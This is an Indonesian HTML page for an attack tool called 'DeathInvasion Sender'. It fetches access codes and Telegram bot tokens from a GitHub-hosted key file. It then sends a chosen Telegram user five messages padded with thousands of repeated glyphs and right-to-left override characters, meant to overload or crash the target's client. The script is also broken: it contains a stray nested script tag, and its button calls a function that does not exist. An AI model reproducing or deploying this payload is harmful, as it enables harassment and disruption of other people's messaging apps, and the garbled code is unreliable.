<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>DeathInvasion Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #0f0;
      text-align: center;
      padding: 40px;
    }
    input, button {
      padding: 10px;
      font-size: 1rem;
      margin: 10px;
      width: 250px;
    }
    button {
      cursor: pointer;
      background: #0f0;
      border: none;
      color: #000;
    }
    #main, #target-section {
      display: none;
    }
  </style>
</head>
<body>

  <h1>💀 DeathInvasion Login</h1>

  <div id="login">
    <input type="text" id="code-token" placeholder="Masukkan kode akses"><br>
    <button onclick="verifyCode()">🔓 Masuk</button>
  </div>

  <div id="main">
    <h2>💥 Sender Aktif</h2>
    <div id="target-section">
      <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
      <button onclick="sendBug()">🚀 Kirim Bug</button>
    </div>
  </div>

  <script>
    let BOT_TOKEN = "";

    async function verifyCode() {
      const code = document.getElementById('code-token').value.trim();
      if (!code) return alert("Masukkan kode dulu 😹");

      try {
        const response = await fetch("https://raw.githubusercontent.com/BimxyzDev/Deathinvasion/main/key-folder/key.json");
        const data = await response.json();

        const entry = data.find(item => item.code === code);
        if (!entry) return alert("❌ Kode salah!");

        BOT_TOKEN = entry.token;

        // Tampilkan UI setelah login
        document.getElementById('login').style.display = "none";
        document.getElementById('main').style.display = "block";
        document.getElementById('target-section').style.display = "block";
      } catch (err) {
        console.error(err);
        alert("❌ Gagal memverifikasi kode");
      }
    }

    <script>
async function sendHeavyBug(targetId, token) {
  const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048); // RTLO + Unicode overload

  const payload = {
    chat_id: targetId,
    text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
    parse_mode: "Markdown"
  };

  for (let i = 1; i <= 5; i++) {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log(`💥 Kirim [${i}/5]`);
    await new Promise(res => setTimeout(res, 700)); // delay buat amanin
  }

  alert("✅ Bug ekstrim telah dikirim 5x ke target.");
}
</script>

</body>
  </html>
